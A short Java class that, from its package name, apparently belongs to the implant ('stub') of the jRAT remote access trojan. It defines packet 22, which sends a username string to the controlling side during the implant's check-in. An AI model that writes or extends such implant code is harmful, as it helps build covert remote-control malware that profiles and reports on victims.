package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;


public class Packet22InitUsername extends AbstractOutgoingPacket {

	private String username;

	public Packet22InitUsername(String username) {
		this.username = username;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(username);
	}

	@Override
	public byte getPacketId() {
		return (byte) 22;
	}
}